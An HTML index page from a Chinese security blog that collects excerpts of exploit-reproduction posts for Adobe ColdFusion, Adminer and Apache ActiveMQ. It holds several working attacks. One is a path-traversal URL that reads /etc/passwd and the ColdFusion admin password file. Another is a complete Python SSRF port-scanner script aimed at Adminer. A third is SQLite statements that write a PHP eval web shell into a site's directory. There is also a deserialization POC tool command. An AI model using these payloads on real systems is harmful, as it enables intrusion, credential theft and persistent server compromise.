<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  
  <title>She11c0de&#39;s blogs</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  <meta property="og:type" content="website">
<meta property="og:title" content="She11c0de&#39;s blogs">
<meta property="og:url" content="https://she11c0de.github.io/page/99/index.html">
<meta property="og:site_name" content="She11c0de&#39;s blogs">
<meta property="og:locale" content="zh_CN">
<meta property="article:author" content="She11c0de">
<meta name="twitter:card" content="summary">
  
  
    <link rel="icon" href="/favicon.png">
  
  <link type="text/css" href="//netdna.bootstrapcdn.com/font-awesome/4.2.0/css/font-awesome.css" rel="stylesheet">
  
<link rel="stylesheet" href="/css/style.css">

  
<link rel="stylesheet" href="/css/scrollUp/image.css">

  <!--[if lt IE 9]><script src="//cdnjs.cloudflare.com/ajax/libs/html5shiv/3.7/html5shiv.min.js"></script><![endif]-->
  
<meta name="generator" content="Hexo 5.4.2"></head>
<body>
  <div id="container">
    <div id="wrap">
      <header id="header">
  <div id="banner"></div>
  <div id="header-outer" class="outer">
    <div id="header-title" class="inner">
      <div class="logo">
        <img src="/logo.png" alt="Profile Picture">
      </div>
      <div id="title">She11c0de's blogs</div>
      
       <ul class="my-socials">
  
 
</ul>
    </div>
  </div>
  <div id="header-inner" class="">
    <nav id="main-nav">
      <a id="main-nav-toggle" class="nav-icon"></a>
      <!--
        
          
            <a class="main-nav-link" href="/">首页</a>
          
            <a class="main-nav-link" href="/categories/life">生活</a>
          
            <a class="main-nav-link" href="/archives">归档</a>
          
        
      -->
    </nav>
    <nav id="title-nav" style="display:none">
      <a href="/">She11c0de&#39;s blogs</a>
      <img src="/logo.png" alt="Profile Picture">
      <!--
      <span id="title-nav-socials">
        
       
     </span>
      -->
    </nav>
    <nav id="sub-nav">
      
      <a id="nav-search-btn" class="nav-icon" title="Search"></a>
    </nav>
    <div id="search-form-wrap">
      <form action="http://www.baidu.com/baidu" method="get" accept-charset="utf-8" class="search-form">
        <input type="search" name="word" maxlength="20" class="search-form-input" placeholder="搜索">
        <input type="submit" value="" class="search-form-submit">
        <input name=tn type=hidden value="bds">
        <input name=cl type=hidden value="3">
        <input name=ct type=hidden value="2097152">
        <input type="hidden" name="si" value="she11c0de.github.io">
      </form>
    </div>
  </div>
  <div class="site-nav" style="display: none;">
    <ul>
      
      
        <li><a href="/">首页</a></li>
      
        <li><a href="/categories/life">生活</a></li>
      
        <li><a href="/archives">归档</a></li>
      
      
    </ul>
  </div>
</header>
      <div class="outer">
        <section id="main">
  

    
    <article id="post-Adobe ColdFusion/（CVE-2017-3066）Adobe ColdFusion 反序列化漏洞" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2022/07/07/Adobe%20ColdFusion/%EF%BC%88CVE-2017-3066%EF%BC%89Adobe%20ColdFusion%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/" class="article-date">
  <time datetime="2022-07-08T06:25:51.936Z" itemprop="datePublished">2022-07-07</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="（CVE-2017-3066）Adobe-ColdFusion-反序列化漏洞"><a href="#（CVE-2017-3066）Adobe-ColdFusion-反序列化漏洞" class="headerlink" title="（CVE-2017-3066）Adobe ColdFusion 反序列化漏洞"></a>（CVE-2017-3066）Adobe ColdFusion 反序列化漏洞</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><p>Adobe ColdFusion (2016 release) Update 3及之前的版本，</p>
<p>ColdFusion 11 Update 11及之前的版本，</p>
<p>ColdFusion 10 Update 22及之前的版本。</p>
<h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><p>使用<a target="_blank" rel="noopener" href="https://github.com/ianxtianxt/ColdFusionPwnn">ColdFusionPwn</a>工具来生成POC。<a target="_blank" rel="noopener" href="http://wiki.0-sec.org/download/ColdFusionPwn-0.0.1-SNAPSHOT-all.zip">点击下载ColdFusionPwn</a></p>
<h2 id="Usage"><a href="#Usage" class="headerlink" title="Usage"></a>Usage</h2><pre><code>java -cp ColdFusionPwn-0.0.1-SNAPSHOT-all.jar:ysoserial-master-SNAPSHOT.jar com.codewhitesec.coldfusionpwn.ColdFusionPwner [-s|-e] [payload type] &#39;[command]&#39; [outfile]
</code></pre>
        
          <p class="article-more-link">
            <a href="/2022/07/07/Adobe%20ColdFusion/%EF%BC%88CVE-2017-3066%EF%BC%89Adobe%20ColdFusion%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/#more">......</a>
          </p>
        
      
    </div>
    <footer class="article-footer">
      
        <a data-url="https://she11c0de.github.io/2022/07/07/Adobe%20ColdFusion/%EF%BC%88CVE-2017-3066%EF%BC%89Adobe%20ColdFusion%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/" data-id="cl5c2qlks000yy8v14w1m7xb7" class="article-share-link">分享到</a>
      

      
    </footer>
  </div>
  
</article>


    
  

    
    <article id="post-Adobe ColdFusion/（CVE-2010-2861）Adobe ColdFusion 文件读取漏洞" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2022/07/07/Adobe%20ColdFusion/%EF%BC%88CVE-2010-2861%EF%BC%89Adobe%20ColdFusion%20%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/" class="article-date">
  <time datetime="2022-07-08T06:25:51.934Z" itemprop="datePublished">2022-07-07</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="（CVE-2010-2861）Adobe-ColdFusion-文件读取漏洞"><a href="#（CVE-2010-2861）Adobe-ColdFusion-文件读取漏洞" class="headerlink" title="（CVE-2010-2861）Adobe ColdFusion 文件读取漏洞"></a>（CVE-2010-2861）Adobe ColdFusion 文件读取漏洞</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><p>Adobe ColdFusion<br>8、9版本中存在一处目录穿越漏洞，可导致未授权的用户读取服务器任意文件。</p>
<h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><p>Adobe ColdFusion 8</p>
<p>Adobe ColdFusion 9</p>
<h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><p>直接访问<code>http://www.0-sec.org:8500/CFIDE/administrator/enter.cfm?locale=../../../../../../../../../../etc/passwd%00en</code>，即可读取文件<code>/etc/passwd</code>：</p>
<p><img src="/resource/(CVE-2010-2861)AdobeColdFusion%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/media/rId24.png"></p>
<p>读取后台管理员密码<code>http://www.0-sec.org:8500/CFIDE/administrator/enter.cfm?locale=../../../../../../../lib/password.properties%00en</code>：</p>
        
          <p class="article-more-link">
            <a href="/2022/07/07/Adobe%20ColdFusion/%EF%BC%88CVE-2010-2861%EF%BC%89Adobe%20ColdFusion%20%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/#more">......</a>
          </p>
        
      
    </div>
    <footer class="article-footer">
      
        <a data-url="https://she11c0de.github.io/2022/07/07/Adobe%20ColdFusion/%EF%BC%88CVE-2010-2861%EF%BC%89Adobe%20ColdFusion%20%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/" data-id="cl5c2qlkr000xy8v112jr1vb0" class="article-share-link">分享到</a>
      

      
    </footer>
  </div>
  
</article>


    
  

    
    <article id="post-Adminer/（CVE-2018-7667）Adminer服务器端请求伪造漏洞" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2022/07/07/Adminer/%EF%BC%88CVE-2018-7667%EF%BC%89Adminer%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%AB%AF%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0%E6%BC%8F%E6%B4%9E/" class="article-date">
  <time datetime="2022-07-08T06:25:51.888Z" itemprop="datePublished">2022-07-07</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="（CVE-2018-7667）Adminer-服务器端请求伪造漏洞"><a href="#（CVE-2018-7667）Adminer-服务器端请求伪造漏洞" class="headerlink" title="（CVE-2018-7667）Adminer 服务器端请求伪造漏洞"></a>（CVE-2018-7667）Adminer 服务器端请求伪造漏洞</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><p>Adminer<br>4.3.1及之前版本存在服务器端请求伪造漏洞。攻击者可借助’server’参数利用该漏洞绕过防火墙，确定内部主机，扫描其他服务器的端口。</p>
<h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><p>Adminer&lt;=4.3.1</p>
<h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><h3 id="poc"><a href="#poc" class="headerlink" title="poc"></a>poc</h3><pre><code>import socket,re,ssl,warnings,subprocess,time
from platform import system as system_name 
from os import system as system_call

#Adminer Server Side Request Forgery
#PortMiner Scanner Tool
#by John Page (hyp3rlinx)
#ISR: ApparitionSec
#hyp3rlinx.altervista.org 
#=========================
#D1rty0Tis says hi.

#timeout
MAX_TIME=32
#ports to log
port_lst=[]  
#Web server response often times out but usually means ports open.
false_pos_ports=[&#39;80&#39;,&#39;443&#39;] 

BANNER=&#39;&#39;&#39;
           ____            _   __  __ _                  
          |  _  \         | | |  \/  (_)                 
          | |__) |__  _ __| |_| \  / |_ _ __   ___ _ __  
          |  ___/ _ \| &#39;__| __| |\/| | | &#39;_ \ / _ \ &#39;__| 
          | |  | (_) | |  | |_| |  | | | | | |  __/ |    
          |_|   \___/|_|   \__|_|  |_|_|_| |_|\___|_|                                                                                                             
       &#39;&#39;&#39;                               
   

def info():
    print &quot;\nPortMiner depends on Error messages to determine open/closed ports.&quot;
    print &quot;Read operations reported &#39;timed out&#39; may be open/filtered.\n&quot;


def greet():
    print &#39;Adminer Unauthenticated SSRF Port Scanner Tool&#39;
    print &#39;Targets Adminer used for MySQL administration\n&#39;
    print &#39;by hyp3rlinx - apparition security&#39;
    print &#39;-----------------------------------------------------\n&#39;
    print &#39;Scan small ranges or single ports or expect to wait.\n&#39;
    print &#39;Do not scan networks without authorized permission.&#39;
    print &#39;Author not responsible for abuse/misuse.\n&#39;

    
def chk_ports(p): 
    p=p.replace(&#39;-&#39;,&#39;,&#39;)
    port_arg=p.split(&#39;,&#39;)
    try:
        if len(port_arg)&gt;1:
            if int(port_arg[1]) &lt; int(port_arg[0]):
                print &#39;Port range not valid.&#39;
                raw_input()
                return
            if int(port_arg[1])&gt;65535:
                print &#39;Exceeded max Port range 65535.&#39;
                raw_input()
                return
    except Exception as e:
        print str(e)
        return None
    return list(range(int(port_arg[0]),int(port_arg[1])+1))



def log(IP):
    try:
        file=open(&#39;PortMiner.txt&#39;, &#39;w&#39;)
        file.write(IP+&#39;\n&#39;)
        for p in port_lst:
            file.write(p+&#39;\n&#39;)
        file.close()
    except Exception as e:
        print str(e)
    print &quot;\nSee PortMiner.txt&quot;


def use_ssl(ADMINER,ADMINER_PORT):
    try:
        s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((ADMINER,int(ADMINER_PORT)))
        s=ssl.wrap_socket(s, keyfile=None, certfile=None, server_side=False, cert_reqs=ssl.CERT_NONE, ssl_version=ssl.PROTOCOL_SSLv23)
        s.close()
    except Exception as e:
        print &quot;&quot;
        return False
    return True


def version(ip,port,uri,use_ssl):
    res=&quot;&quot;
    try:
        s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((ip,int(port)))
        if use_ssl:
            s=ssl.wrap_socket(s, keyfile=None, certfile=None, server_side=False, cert_reqs=ssl.CERT_NONE, ssl_version=ssl.PROTOCOL_SSLv23) 
        s.send(&#39;GET &#39;+&#39;/&#39;+uri+&#39;/?server=&#39;+&#39;:&#39;+&#39;&amp;username=\r\n\r\n&#39;)

    except Exception as e:
        print &#39;Host up but cant connect.&#39; #str(e)
        print &#39;Re-check Host/Port/URI.&#39;
        s.close()
        return 504
     
    while True:
        RES=s.recv(512)
        if RES.find(&#39;Forbidden&#39;)!=-1:
            print &#39;Forbidden 403&#39;
            s.close()
            return None
        if RES.find(&#39;401 Authorization Required&#39;)!=-1:
            print &#39;401 Authorization Required&#39;
            s.close()
            return None
        ver = re.findall(r&#39;&lt;span&gt;(.*)&lt;/span&gt;&#39;,RES,re.DOTALL|re.MULTILINE)
        if not RES:
            s.close()
            return None
        if ver:
            print &#39;Your Adminer &#39;+ ver[0] + &#39; works for us now.&#39;
            s.close()
            return ver

    s.close()
    return None
 
       
               
def scan(ADMINER,ADMINER_PORT,ADMINER_URI,TARGET,PORTS_TO_SCAN,PRINT_CLOSED,USE_SSL):
    global MAX_TIME,port_range
    RES=&#39;&#39;

    print &#39;scanning ports: %s &#39; % str(port_range[0])+&#39;to &#39; + str(port_range[-1])+&#39; ...&#39;
    
    for aPort in port_range: 
         aPort=str(aPort)
         
         try:
             s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             s.settimeout(MAX_TIME)
             s.connect((ADMINER,ADMINER_PORT))
    
             if USE_SSL:
                s=ssl.wrap_socket(s, keyfile=None, certfile=None, server_side=False, cert_reqs=ssl.CERT_NONE, ssl_version=ssl.PROTOCOL_SSLv23) 

             s.send(&#39;GET /&#39;+ADMINER_URI+&#39;/?server=&#39;+TARGET+&#39;:&#39;+aPort+&#39;&amp;username= HTTP/1.1\r\nHost: &#39;+TARGET+&#39;\r\n\r\n&#39;)
    
         except Exception as e:
              print str(e)
              s.close()
              return

         while True:
              try:
                 RES=s.recv(512)
                 ###print RES
                 ###Should see HTTP/1.1 403 not 200
                 if RES.find(&#39;HTTP/1.1 200 OK&#39;)!=-1:
                     print &#39;port &#39;+aPort +  &#39; open&#39;
                     port_lst.append(aPort+&#39; open&#39;)
                     s.close()
                     break
                    
                 if RES.find(&#39;400 Bad Request&#39;)!=-1:
                     print &#39;400 Bad Request, check params&#39;
                     s.close()
                     break
                     raw_input()                  

                 lst=re.findall(r&quot;([^\n&lt;div&gt;].*connect to MySQL server on.*[^&lt;/div&gt;\n])|(Lost connection to MySQL server at.*)|(MySQL server has gone away.*)&quot;+
                             &quot;|(No connection could be made because the target machine actively refused it.*)|(A connection attempt failed.*)|(HTTP/1.1 200 OK.*)&quot;, RES)     
        
                 if lst:
                      status=str(lst)
                      if status.find(&#39;connect to MySQL&#39;)!=-1:
                          if PRINT_CLOSED:
                              print &#39;port &#39;+ aPort +  &#39; closed&#39;
                          s.close()
                          break
                      elif status.find(&#39;machine actively refused it.&#39;)!=-1:
                          if PRINT_CLOSED:
                              print &#39;port &#39;+ aPort +  &#39; closed&#39;
                          s.close()
                          break
                      elif status.find(&#39;A connection attempt failed&#39;)!=-1:
                          if PRINT_CLOSED:
                               print &#39;port &#39;+ aPort +  &#39; closed&#39;
                          s.close()
                          break
                      elif status.find(&#39;reading initial communication packet&#39;)!=-1:
                          print &#39;port &#39;+aPort +  &#39; open&#39;
                          port_lst.append(aPort+&#39; open&#39;)
                          s.close()
                          break
                      elif status.find(&#39;MySQL server has gone away&#39;)!=-1:
                          print &#39;port &#39;+aPort +  &#39; open&#39;
                          port_lst.append(aPort+&#39; open&#39;)
                          s.close()
                          break
                      elif status.find(&#39;Bad file descriptor&#39;)!=-1:
                          print &#39;port &#39;+aPort +  &#39; open&#39;
                          port_lst.append(aPort+&#39; open&#39;)
                          s.close()
                          break
                      elif status.find(&#39;Got packets out of order&#39;)!=-1:
                          print &#39;port &#39;+aPort +  &#39; open&#39;
                          s.close()
                          break
                        
              except Exception  as e:
                  msg = str(e)
                  ###print msg
                  if msg.find(&#39;timed out&#39;)!=-1 and aPort in false_pos_ports:
                      print &#39;port &#39;+aPort +  &#39; open&#39;
                      port_lst.append(aPort+&#39; open&#39;)
                      s.close()
                      break
                  elif msg.find(&#39;timed out&#39;)!=-1: 
                      print &#39;port &#39;+aPort + &#39; timed out&#39;
                      port_lst.append(aPort+&#39; read operation timed out&#39;)
                      s.close()
                      break
                  else:
                      s.close()
                      break
               
    if port_lst:
        log(TARGET)
    else:
        print &quot;Scan completed, no ports mined.&quot;
    return 0



def arp(host):
    args = &quot;-a&quot; if system_name().lower()==&quot;windows&quot; else &quot;-e&quot;
    return subprocess.call(&quot;arp &quot; + args + &quot; &quot; + host, shell=True) == 0
         

def ping_host(host):
    args = &quot;-n 1&quot; if system_name().lower()==&quot;windows&quot; else &quot;-c 1&quot;
    res=subprocess.call(&quot;ping &quot; + args + &quot; &quot; + host, shell=True) == 0
    if not res:
        print str(host) + &#39; down? trying ARP&#39;
        if not arp(host):
            print str(host) + &#39; unreachable.&#39;
            return
    return res

    

def main():
    global port_range
    print BANNER
    greet()
    ADMINER_VERSION=False
    PRINT_CLOSED=False
    USE_SSL=None

    ADMINER=raw_input(&#39;[+] Adminer Host/IP&gt; &#39;)
    if ADMINER==&#39;&#39;:
        print &#39;Enter valid Host/IP&#39;
        ADMINER=raw_input(&#39;[+] Adminer Host/IP&gt; &#39;)
    
    ADMINER_PORT=raw_input(&#39;[+] Adminer Port&gt; &#39;)
    if not re.search(&quot;^\d&#123;1,5&#125;$&quot;,ADMINER_PORT):
        print &#39;Enter a valid Port.&#39;
        ADMINER_PORT=raw_input(&#39;[+] Adminer Port&gt; &#39;)
    
    ADMINER_URI=raw_input(&#39;[+] Adminer URI [the adminer-&lt;version&gt;.php OR adminer/ dir path] &gt; &#39;)
    TARGET=raw_input(&#39;[+] Host/IP to Scan&gt; &#39;)
    
    PORTS_TO_SCAN=raw_input(&#39;[+] Port Range e.g. 21-25&gt; &#39;).replace(&#39; &#39;,&#39;&#39;)
    plst=re.findall(r&quot;(\d&#123;1,5&#125;)-(\d&#123;1,5&#125;)&quot;,PORTS_TO_SCAN)
    if not plst:
        print &#39;Invalid ports, format is 1-1025&#39;
        return
        raw_input() #console up

    port_range=chk_ports(PORTS_TO_SCAN)
    if not port_range:
        return

    PRINT_CLOSED=raw_input(&#39;[+] Print closed ports? 1=Yes any key for No&gt; &#39;)
    if PRINT_CLOSED==&#39;1&#39;:
        PRINT_CLOSED=True
    else:
        PRINT_CLOSED=False
    
    if not ping_host(ADMINER):
        print &#39;host %s not reachable or blocking ping &#39; % ADMINER  
        cont=raw_input(&#39;Continue with scan? 1=Yes any key for No&gt; &#39;)
        if cont!=&#39;1&#39;:
            print &#39;Scan aborted.&#39;
            raw_input() #console up
            return
        

    USE_SSL=use_ssl(ADMINER,ADMINER_PORT)
    time.sleep(2)
    ADMINER_VERSION = version(ADMINER,ADMINER_PORT,ADMINER_URI,USE_SSL)

    if not ADMINER_VERSION:
        print &quot;Can&#39;t retrieve Adminer script. check supplied URI.&quot;
        raw_input() #console up
        return
    else:
        if ADMINER_VERSION==504:
            raw_input() #console up
            return
        if scan(ADMINER,int(ADMINER_PORT),ADMINER_URI,TARGET,PORTS_TO_SCAN,PRINT_CLOSED,USE_SSL)==0:
            more=raw_input(&#39;Info: 1=Yes, any key for No&gt; &#39;)
            if more==&#39;1&#39;:
                info()
                raw_input() #console up

    
if __name__==&#39;__main__&#39;:
    main()
</code></pre>

        
          <p class="article-more-link">
            <a href="/2022/07/07/Adminer/%EF%BC%88CVE-2018-7667%EF%BC%89Adminer%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%AB%AF%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0%E6%BC%8F%E6%B4%9E/#more">......</a>
          </p>
        
      
    </div>
    <footer class="article-footer">
      
        <a data-url="https://she11c0de.github.io/2022/07/07/Adminer/%EF%BC%88CVE-2018-7667%EF%BC%89Adminer%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%AB%AF%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0%E6%BC%8F%E6%B4%9E/" data-id="cl5c2qlid000wy8v1hl23ay1p" class="article-share-link">分享到</a>
      

      
    </footer>
  </div>
  
</article>


    
  

    
    <article id="post-Adminer/Adminers 1.1.3 （SQLite 3 写入一句话木马）" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2022/07/07/Adminer/Adminers%201.1.3%20%EF%BC%88SQLite%203%20%E5%86%99%E5%85%A5%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC%EF%BC%89/" class="article-date">
  <time datetime="2022-07-08T06:25:51.886Z" itemprop="datePublished">2022-07-07</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="Adminers-1-1-3-（SQLite-3-写入一句话木马）"><a href="#Adminers-1-1-3-（SQLite-3-写入一句话木马）" class="headerlink" title="Adminers 1.1.3 （SQLite 3 写入一句话木马）"></a>Adminers 1.1.3 （SQLite 3 写入一句话木马）</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><p>需要登陆Adminers，并且需要知道网站的路径。</p>
<h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><pre><code>ATTACH DATABASE &#39;z.php&#39; AS t;create TABLE t.e (d text);/*

ATTACH DATABASE &#39;/网站/路径/shell.php&#39; AS t;insert INTO t.e (d) VALUES (&#39;&lt;?php eval($_POST[a])?&gt;&#39;);/*
</code></pre>

        
          <p class="article-more-link">
            <a href="/2022/07/07/Adminer/Adminers%201.1.3%20%EF%BC%88SQLite%203%20%E5%86%99%E5%85%A5%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC%EF%BC%89/#more">......</a>
          </p>
        
      
    </div>
    <footer class="article-footer">
      
        <a data-url="https://she11c0de.github.io/2022/07/07/Adminer/Adminers%201.1.3%20%EF%BC%88SQLite%203%20%E5%86%99%E5%85%A5%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC%EF%BC%89/" data-id="cl5c2qlic000vy8v16tw0fg65" class="article-share-link">分享到</a>
      

      
    </footer>
  </div>
  
</article>


    
  

    
    <article id="post-Adminer/Adminer 任意文件读取漏洞" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2022/07/07/Adminer/Adminer%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/" class="article-date">
  <time datetime="2022-07-08T06:25:51.884Z" itemprop="datePublished">2022-07-07</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="Adminer-任意文件读取漏洞"><a href="#Adminer-任意文件读取漏洞" class="headerlink" title="Adminer 任意文件读取漏洞"></a>Adminer 任意文件读取漏洞</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><p>准确的说该漏洞源于MySQL LOAD DATA 读取客户端任意文件</p>
<p>Mysql可以使用<code>LOAD DATA INFILE</code>来读取文件，通常有两种用法，分别是：</p>
<pre><code>load data infile &quot;/data/data.csv&quot; into table test;
load data local infile &quot;/data/data.csv&quot; into table test;
</code></pre>
<ul>
<li><p>  第一种用法是从mysql自己的服务器上读取data.csv文件.</p>
</li>
<li><p>  第二种用法是客户端把客户端电脑上的data.csv发给mysql服务器的表中.</p>
</li>
</ul>
<p>而mysql客户端读取漏洞利用的语句即第二条语句.</p>
<h3 id="前提"><a href="#前提" class="headerlink" title="前提"></a>前提</h3><ul>
<li>  phpmyadmin 开启了远程连接选项，adminer是默认开启的.</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- --&gt;</span><br></pre></td></tr></table></figure>
        
          <p class="article-more-link">
            <a href="/2022/07/07/Adminer/Adminer%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/#more">......</a>
          </p>
        
      
    </div>
    <footer class="article-footer">
      
        <a data-url="https://she11c0de.github.io/2022/07/07/Adminer/Adminer%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/" data-id="cl5c2qlic000uy8v114s67urj" class="article-share-link">分享到</a>
      

      
    </footer>
  </div>
  
</article>


    
  

    
    <article id="post-ActiveMQ/（CVE-2017-15709）ActiveMQ 信息泄漏漏洞" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2022/07/07/ActiveMQ/%EF%BC%88CVE-2017-15709%EF%BC%89ActiveMQ%20%E4%BF%A1%E6%81%AF%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E/" class="article-date">
  <time datetime="2022-07-08T06:25:51.833Z" itemprop="datePublished">2022-07-07</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="（CVE-2017-15709）ActiveMQ-信息泄漏漏洞"><a href="#（CVE-2017-15709）ActiveMQ-信息泄漏漏洞" class="headerlink" title="（CVE-2017-15709）ActiveMQ 信息泄漏漏洞"></a>（CVE-2017-15709）ActiveMQ 信息泄漏漏洞</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><p>Apache<br>ActiveMQ默认消息队列61616端口对外，61616端口使用了OpenWire协议，这个端口会暴露服务器相关信息，这些相关信息实际上是debug信息。</p>
<p>会返回应用名称，JVM，操作系统以及内核版本等信息。</p>
<h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><p>apache-activemq-5.15.0 to apache-activemq-5.15.2apache-activemq-5.14.0 to apache-activemq-5.14.5</p>
<h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><p><img src="/resource/(CVE-2017-15709)ActiveMQ%E4%BF%A1%E6%81%AF%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E/media/rId24.png"></p>

        
          <p class="article-more-link">
            <a href="/2022/07/07/ActiveMQ/%EF%BC%88CVE-2017-15709%EF%BC%89ActiveMQ%20%E4%BF%A1%E6%81%AF%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E/#more">......</a>
          </p>
        
      
    </div>
    <footer class="article-footer">
      
        <a data-url="https://she11c0de.github.io/2022/07/07/ActiveMQ/%EF%BC%88CVE-2017-15709%EF%BC%89ActiveMQ%20%E4%BF%A1%E6%81%AF%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E/" data-id="cl5c2qlgz000ty8v1fm1kbftu" class="article-share-link">分享到</a>
      

      
    </footer>
  </div>
  
</article>


    
  

    
    <article id="post-ActiveMQ/（CVE-2016-3088）ActiveMQ应用漏洞" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2022/07/07/ActiveMQ/%EF%BC%88CVE-2016-3088%EF%BC%89ActiveMQ%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/" class="article-date">
  <time datetime="2022-07-08T06:25:51.831Z" itemprop="datePublished">2022-07-07</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="（CVE-2016-3088）ActiveMQ应用漏洞"><a href="#（CVE-2016-3088）ActiveMQ应用漏洞" class="headerlink" title="（CVE-2016-3088）ActiveMQ应用漏洞"></a>（CVE-2016-3088）ActiveMQ应用漏洞</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><p>ActiveMQ是一款流行的开源消息服务器。默认情况下，ActiveMQ服务是没有配置安全参数。恶意人员可以利用默认配置弱点发动远程命令执行攻击，获取服务器权限，从而导致数据泄露。</p>
<h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><p>Apache ActiveMQ 5.x ~ 5.14.0</p>
<h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><p>漏洞是需要登录之后才可以执行</p>
<p>漏洞利用就是/fileserver/有put上传权限，/admin/有执行权限，可找到绝对路径，使用move移动文件到/admin/</p>
<p>下面就是两步走，先是利用put上传文件到/fileserver/,然后移动到move到admin下面</p>
<p>所有返回为204就代表是成功，有个坑点：不要put同文件名的文件上去</p>
        
          <p class="article-more-link">
            <a href="/2022/07/07/ActiveMQ/%EF%BC%88CVE-2016-3088%EF%BC%89ActiveMQ%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/#more">......</a>
          </p>
        
      
    </div>
    <footer class="article-footer">
      
